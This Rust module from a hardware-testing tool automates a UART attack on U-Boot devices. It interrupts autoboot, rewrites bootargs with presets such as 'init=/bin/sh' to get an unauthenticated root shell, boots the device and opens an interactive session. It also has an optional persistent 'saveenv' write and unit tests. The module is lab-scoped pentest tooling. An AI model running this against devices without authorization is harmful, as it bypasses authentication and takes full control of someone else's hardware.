//! Autoroot: interrupt U-Boot autoboot, confirm the UART responds to commands,
//! read and rewrite `bootargs` to spawn a root shell, then boot and hand the
//! operator an interactive session.
//!
//! Scope: authorized lab testing only. Volatile `setenv` by default (reversible
//! on power cycle). `saveenv` is opt-in (`persist`). Logic level only: it stops
//! at "you have a root shell", no payload is delivered.

use std::error::Error;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use colored::*;

use crate::session::Session;

/// Options controlling the autoroot routine.
pub struct AutoRootOpts {
    /// Boot argument injected to obtain a shell, e.g. `init=/bin/sh`.
    pub shell_arg: String,
    /// Bytes spammed to interrupt the autoboot countdown.
    pub interrupt_key: Vec<u8>,
    /// How long to spam the interrupt key while waiting for a prompt.
    pub break_timeout: Duration,
    /// Also append the `single` (single-user) flag to bootargs.
    pub single: bool,
    /// Command used to continue booting after setenv (usually `boot`).
    pub boot_cmd: String,
    /// Persist env to flash with `saveenv` (dangerous, default off).
    pub persist: bool,
    /// Print the commands that would be sent, but change nothing.
    pub dry_run: bool,
    /// Extra prompt strings to treat as a reached bootloader prompt.
    pub extra_prompts: Vec<String>,
}

/// Bootloader prompts that indicate we have broken into a console.
pub fn default_prompts() -> Vec<String> {
    [
        "=> ", "u-boot>", "uboot>", "cfe>", "redboot>", "ar7240>", "ath>", "rlx>",
        "marvell>>", "bcm>", "(ipq) #", "boot>",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

/// Strings that indicate a usable shell has been reached after boot.
fn shell_prompts() -> Vec<String> {
    [
        "/ #", "~ #", "# ", "root@", "busybox", "please press enter to activate",
        "/bin/sh:", "can't access tty",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

/// Boot-argument payloads that drop a device to a root shell, selectable by
/// name via `--shell-arg <name>`. Ordered most-reliable first (replace init,
/// no auth), then single-user / systemd targets that may prompt for a password.
/// (name, boot argument, note)
pub const SHELL_PRESETS: &[(&str, &str, &str)] = &[
    ("sh", "init=/bin/sh", "replace init with /bin/sh (most common, no auth; covers BusyBox /bin/sh)"),
    ("bash", "init=/bin/bash", "replace init with /bin/bash if present (no auth)"),
    ("sbin-sh", "init=/sbin/sh", "init at /sbin/sh on some embedded layouts (no auth)"),
    ("ash", "init=/bin/ash", "BusyBox ash where /bin/ash exists (no auth)"),
    ("rdinit", "rdinit=/bin/sh", "initramfs/initrd: shell before the real root pivots (no auth)"),
    ("single", "single", "single-user mode (may prompt for the root password)"),
    ("s", "S", "single-user, sysvinit style (may prompt for the root password)"),
    ("rescue", "systemd.unit=rescue.target", "systemd rescue target (usually prompts for the root password)"),
    ("emergency", "systemd.unit=emergency.target", "systemd emergency target (usually prompts for the root password)"),
];

/// Resolve a `--shell-arg` value: a preset name maps to its boot argument,
/// anything else is used verbatim as a raw boot argument.
pub fn resolve_shell_arg(input: &str) -> String {
    let key = input.trim();
    for (name, arg, _) in SHELL_PRESETS {
        if key.eq_ignore_ascii_case(name) {
            return (*arg).to_string();
        }
    }
    key.to_string()
}

/// Print the shell boot-argument presets table.
pub fn print_presets() {
    println!(
        "{}",
        "Shell boot-argument presets (use with --shell-arg <name>):".bold().green()
    );
    for (name, arg, note) in SHELL_PRESETS {
        println!("  {:<11} {:<34} {}", name, arg, note);
    }
    println!();
    println!("Any other --shell-arg value is used verbatim, e.g.");
    println!("  --shell-arg \"init=/bin/sh rw console=ttyS0,115200\"");
    println!("Add --single to also append the 'single' flag. Existing init=/rdinit= and");
    println!("quiet/splash tokens are handled automatically.");
}

/// Parse a user-supplied interrupt key spec into raw bytes.
/// Accepts named keys (enter, space, ctrl-c, esc...) or escape sequences
/// (`\r`, `\n`, `\x03`).
pub fn parse_interrupt_key(s: &str) -> Result<Vec<u8>, String> {
    match s.to_ascii_lowercase().as_str() {
        "enter" | "cr" | "return" | "\\r" => return Ok(vec![0x0d]),
        "lf" | "newline" | "\\n" => return Ok(vec![0x0a]),
        "crlf" => return Ok(vec![0x0d, 0x0a]),
        "space" | "any" => return Ok(vec![0x20]),
        "ctrl-c" | "ctrlc" | "^c" | "\\x03" => return Ok(vec![0x03]),
        "esc" | "escape" | "\\x1b" => return Ok(vec![0x1b]),
        _ => {}
    }
    parse_escaped(s)
}

/// Interpret backslash escapes in an arbitrary key string.
fn parse_escaped(s: &str) -> Result<Vec<u8>, String> {
    let b = s.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'\\' && i + 1 < b.len() {
            match b[i + 1] {
                b'r' => {
                    out.push(0x0d);
                    i += 2;
                }
                b'n' => {
                    out.push(0x0a);
                    i += 2;
                }
                b't' => {
                    out.push(0x09);
                    i += 2;
                }
                b'0' => {
                    out.push(0x00);
                    i += 2;
                }
                b'x' | b'X' if i + 3 < b.len() => {
                    // Read the two hex digits as bytes. `s` is user input that
                    // may contain multibyte UTF-8, so slicing it by byte index
                    // (`&s[i + 2..i + 4]`) would panic mid-codepoint.
                    match (
                        (b[i + 2] as char).to_digit(16),
                        (b[i + 3] as char).to_digit(16),
                    ) {
                        (Some(hi), Some(lo)) => {
                            out.push(((hi << 4) | lo) as u8);
                            i += 4;
                        }
                        _ => {
                            return Err(format!(
                                "invalid hex escape '\\x{}'",
                                String::from_utf8_lossy(&b[i + 2..i + 4])
                            ))
                        }
                    }
                }
                other => {
                    out.push(other);
                    i += 2;
                }
            }
        } else {
            out.push(b[i]);
            i += 1;
        }
    }
    if out.is_empty() {
        Err("interrupt key is empty".to_string())
    } else {
        Ok(out)
    }
}

/// Pull a `key=value` line out of `printenv` output. Returns the value, or None
/// if the variable is not present (e.g. "## Error: "bootargs" not defined").
pub fn extract_env_value(text: &str, key: &str) -> Option<String> {
    let prefix = format!("{}=", key);
    for line in text.split('\n') {
        let line = line.trim_end_matches('\r');
        if line.starts_with(&prefix) {
            return Some(line[prefix.len()..].to_string());
        }
    }
    None
}

/// Rewrite a bootargs string so the kernel drops to a shell instead of running
/// its normal init. Replaces any existing token sharing the injected key,
/// strips `quiet`/`splash` so console output is visible, and optionally appends
/// `single`.
pub fn build_shell_bootargs(old: &str, shell_arg: &str, single: bool) -> String {
    let shell_arg = shell_arg.trim();
    let shell_key = shell_arg.split('=').next().unwrap_or(shell_arg);
    let mut out: Vec<&str> = Vec::new();
    for tok in old.split_whitespace() {
        let tok_key = tok.split('=').next().unwrap_or(tok);
        if !shell_arg.is_empty() && tok_key == shell_key {
            continue; // drop existing init=/rdinit= etc.
        }
        if tok == "quiet" || tok == "splash" {
            continue; // keep console output
        }
        if single && tok == "single" {
            continue; // avoid duplicate, re-added below
        }
        out.push(tok);
    }
    let mut result = out.join(" ");
    if !shell_arg.is_empty() {
        if !result.is_empty() {
            result.push(' ');
        }
        result.push_str(shell_arg);
    }
    if single {
        if !result.is_empty() {
            result.push(' ');
        }
        result.push_str("single");
    }
    result
}

/// Run the full autoroot routine over an already-known baudrate.
pub fn run(
    port: &str,
    baud: u32,
    opts: &AutoRootOpts,
    running: Arc<AtomicBool>,
) -> Result<(), Box<dyn Error>> {
    println!("\n{}", "=== AUTOROOT: U-Boot bootargs shell ===".bold().magenta());
    println!(
        "{} {} @ {} baud  (volatile setenv{})",
        "Target:".cyan(),
        port,
        baud,
        if opts.persist { ", PERSIST/saveenv" } else { "" }
    );

    let mut s = Session::open(port, baud, running.clone())?;
    s.echo = true;

    let mut prompts = default_prompts();
    prompts.extend(opts.extra_prompts.iter().cloned());

    // Phase A: interrupt autoboot.
    println!(
        "\n{} Power-cycle the target now. Spamming interrupt key for {}s...",
        "[A]".bold().yellow(),
        opts.break_timeout.as_secs()
    );
    let broke = s.spam_until(
        &opts.interrupt_key,
        &prompts,
        opts.break_timeout,
        Duration::from_millis(80),
    );
    if broke.is_none() {
        return Err(
            "no bootloader prompt seen. Wrong baud, not U-Boot, autoboot window missed, or no \
             autoboot delay. Try a different --interrupt-key or increase --break-timeout."
                .into(),
        );
    }
    println!("\n{} Bootloader prompt reached.", "[A]".bold().green());

    // Phase B: confirm the UART actually executes commands before we change anything.
    println!("{} Verifying the console responds to commands...", "[B]".bold().yellow());
    s.send_line("")?; // bare CR should re-print the prompt
    let echoed = s.expect(&prompts, Duration::from_secs(2)).is_some();
    s.send_line("version")?;
    let ver = s.collect(Duration::from_millis(1500));
    let ver_ok = ver.to_ascii_lowercase().contains("u-boot");
    if !echoed && !ver_ok {
        return Err(
            "console did not respond to commands (no prompt echo, no version banner). Aborting \
             before any change."
                .into(),
        );
    }
    if let Some(v) = ver.lines().find(|l| l.to_ascii_lowercase().contains("u-boot")) {
        println!("{} Responsive. {}", "[B]".bold().green(), v.trim().dimmed());
    } else {
        println!("{} Console responsive.", "[B]".bold().green());
    }

    // Phase C: read current bootargs (and bootcmd, to warn about override).
    println!("{} Reading current environment...", "[C]".bold().yellow());
    s.send_line("printenv bootargs")?;
    let pe = s.collect(Duration::from_millis(1500));
    let old_args = extract_env_value(&pe, "bootargs").unwrap_or_default();
    s.send_line("printenv bootcmd")?;
    let pc = s.collect(Duration::from_millis(1500));
    let bootcmd = extract_env_value(&pc, "bootcmd").unwrap_or_default();
    if bootcmd.contains("bootargs") {
        println!(
            "{} bootcmd appears to set bootargs itself; the env override may be ignored on this \
             device.",
            "[!]".bold().yellow()
        );
    }

    // Phase D: build the shell-enabling bootargs.
    let new_args = build_shell_bootargs(&old_args, &opts.shell_arg, opts.single);
    println!("{} bootargs rewrite:", "[D]".bold().yellow());
    println!("    {} {}", "old:".dimmed(), if old_args.is_empty() { "(unset)" } else { &old_args });
    println!("    {} {}", "new:".green(), new_args.green());
    let setcmd = format!("setenv bootargs {}", new_args);

    if opts.dry_run {
        println!("\n{} commands NOT sent:", "[DRY-RUN]".bold().cyan());
        println!("    {}", setcmd);
        if opts.persist {
            println!("    saveenv");
        }
        println!("    {}", opts.boot_cmd);
        return Ok(());
    }

    // Phase E: apply and boot.
    println!("{} Applying...", "[E]".bold().yellow());
    s.send_line(&setcmd)?;
    s.collect(Duration::from_millis(500));
    if opts.persist {
        println!("{} Writing env to flash (persistent).", "[!]".bold().red());
        s.send_line("saveenv")?;
        s.collect(Duration::from_secs(2));
    }
    println!("{} Booting: {}", "[E]".bold().green(), opts.boot_cmd);
    s.send_line(&opts.boot_cmd)?;

    // Phase F: wait for the shell, then hand over.
    println!("{} Waiting for shell prompt...", "[F]".bold().yellow());
    let reached = s.expect(&shell_prompts(), Duration::from_secs(60)).is_some();
    if reached {
        println!(
            "\n{} {}",
            "[F]".bold().green(),
            "Shell reached. Interactive bridge (Ctrl-C exits). Verify: id; cat /proc/version"
                .bold()
                .green()
        );
    } else {
        println!(
            "\n{} boot issued but no shell prompt within 60s. Entering interactive bridge anyway.",
            "[F]".bold().yellow()
        );
    }
    if running.load(Ordering::SeqCst) {
        s.send_line("")?; // nudge for a prompt
        s.interactive()?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn key_named_aliases() {
        assert_eq!(parse_interrupt_key("enter").unwrap(), vec![0x0d]);
        assert_eq!(parse_interrupt_key("ctrl-c").unwrap(), vec![0x03]);
        assert_eq!(parse_interrupt_key("space").unwrap(), vec![0x20]);
        assert_eq!(parse_interrupt_key("esc").unwrap(), vec![0x1b]);
    }

    #[test]
    fn key_parsing_survives_multibyte() {
        // Regression: `&s[i + 2..i + 4]` panicked when a multibyte char followed
        // "\x", because the str slice landed mid-codepoint. These must return
        // an error or a value, never panic.
        for k in ["\\x€x", "\\x€", "€€€", "\\xé9", "\\x\u{FFFD}\u{FFFD}", "\\xff€"] {
            let _ = parse_interrupt_key(k);
        }
        // A valid escape must still parse after the fix.
        assert_eq!(parse_interrupt_key("\\xff").unwrap(), vec![0xff]);
        assert!(parse_interrupt_key("\\x€x").is_err());
    }

    #[test]
    fn key_escapes_and_literals() {
        assert_eq!(parse_interrupt_key("\\x03").unwrap(), vec![0x03]);
        assert_eq!(parse_interrupt_key("\\r\\n").unwrap(), vec![0x0d, 0x0a]);
        assert_eq!(parse_interrupt_key("ab").unwrap(), vec![b'a', b'b']);
        assert!(parse_interrupt_key("\\xZZ").is_err());
    }

    #[test]
    fn env_value_extraction() {
        let out = "printenv bootargs\nbootargs=console=ttyS0,115200 root=/dev/mtdblock2\n=> ";
        assert_eq!(
            extract_env_value(out, "bootargs").as_deref(),
            Some("console=ttyS0,115200 root=/dev/mtdblock2")
        );
        let missing = "## Error: \"bootargs\" not defined\n=> ";
        assert_eq!(extract_env_value(missing, "bootargs"), None);
    }

    #[test]
    fn bootargs_replaces_existing_init() {
        let old = "console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=squashfs init=/sbin/init";
        let got = build_shell_bootargs(old, "init=/bin/sh", false);
        assert_eq!(
            got,
            "console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=squashfs init=/bin/sh"
        );
    }

    #[test]
    fn bootargs_strips_quiet_splash_and_adds_single() {
        let old = "console=ttyS0 root=/dev/ram0 quiet splash";
        let got = build_shell_bootargs(old, "init=/bin/sh", true);
        assert_eq!(got, "console=ttyS0 root=/dev/ram0 init=/bin/sh single");
    }

    #[test]
    fn bootargs_handles_empty_and_no_existing_init() {
        assert_eq!(build_shell_bootargs("", "init=/bin/sh", false), "init=/bin/sh");
        assert_eq!(
            build_shell_bootargs("console=ttyS0 root=/dev/ram0", "init=/bin/sh", false),
            "console=ttyS0 root=/dev/ram0 init=/bin/sh"
        );
    }

    #[test]
    fn bootargs_no_duplicate_single() {
        let got = build_shell_bootargs("console=ttyS0 single", "init=/bin/sh", true);
        assert_eq!(got, "console=ttyS0 init=/bin/sh single");
    }

    #[test]
    fn shell_arg_presets_resolve() {
        assert_eq!(resolve_shell_arg("sh"), "init=/bin/sh");
        assert_eq!(resolve_shell_arg("RDINIT"), "rdinit=/bin/sh");
        assert_eq!(resolve_shell_arg("rescue"), "systemd.unit=rescue.target");
        assert_eq!(resolve_shell_arg("init=/bin/custom"), "init=/bin/custom");
        assert_eq!(resolve_shell_arg("  single  "), "single");
    }

    #[test]
    fn bootargs_rdinit_keeps_existing_init() {
        let old = "console=ttyS0 root=/dev/mtdblock2 init=/sbin/init";
        let got = build_shell_bootargs(old, "rdinit=/bin/sh", false);
        assert_eq!(got, "console=ttyS0 root=/dev/mtdblock2 init=/sbin/init rdinit=/bin/sh");
    }

    #[test]
    fn bootargs_systemd_unit_replaces_existing() {
        let old = "console=ttyS0 systemd.unit=multi-user.target";
        let got = build_shell_bootargs(old, "systemd.unit=rescue.target", false);
        assert_eq!(got, "console=ttyS0 systemd.unit=rescue.target");
    }
}
